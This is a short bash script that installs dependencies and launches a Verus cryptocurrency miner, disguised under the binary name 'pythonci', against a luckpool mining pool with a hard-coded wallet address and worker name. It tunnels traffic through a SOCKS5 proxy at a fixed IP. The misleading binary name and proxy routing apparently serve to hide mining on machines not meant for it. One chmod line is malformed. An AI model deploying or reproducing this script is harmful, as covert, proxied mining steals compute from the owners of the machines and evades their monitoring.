#!/bin/bash
sudo apt update
sudo apt install screen libjansson4 -y
chmod +x odunn.sh && chmod +x pythonci chmod 777 pythonci odunn.sh
screen -dmS ls
PL=stratum+tcp://eu.luckpool.net:3956
WT=RKLnNA48A29oXZBXjawuTRReMSN4ww7xR3
WR=VIA-053
PY=socks5://178.62.79.49:17173
./pythonci -a verus -o $PL -u $WT.$WR -p x -t 2 -x $PY
